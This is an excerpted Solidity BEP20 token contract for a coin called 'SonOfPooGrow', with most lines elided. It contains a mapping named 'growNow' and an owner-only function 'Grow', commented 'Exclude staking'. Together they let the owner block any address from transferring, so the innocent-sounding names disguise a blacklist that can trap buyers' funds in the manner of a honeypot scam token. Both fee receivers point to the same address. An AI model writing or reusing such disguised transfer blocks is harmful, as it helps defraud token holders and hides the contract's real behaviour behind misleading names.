...
/**
 Telegram - https://t.me/SonPooGrow
*/
...
contract SonOfPooGrow is IBEP20, Auth {
    ...
    string constant _name = "SonOfPooGrow";
    string constant _symbol = "SONPooGrow";
    ...
    mapping (address => bool) public growNow;
    ...
    address public marketingFeeReceiver = 0x8742E473FB14064D7Ecb54a751c6Fee38dAc4BD3;
    address public devFeeReceiver = 0x8742E473FB14064D7Ecb54a751c6Fee38dAc4BD3;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!growNow[recipient] && !growNow[sender], 'Address is excluded.');
   ...
   function setMaxWallet(uint256 amount) external onlyOwner {
    ...
    // Exclude staking
    function Grow(address _address, bool _value) public onlyOwner{
        growNow[_address] = _value;
    }
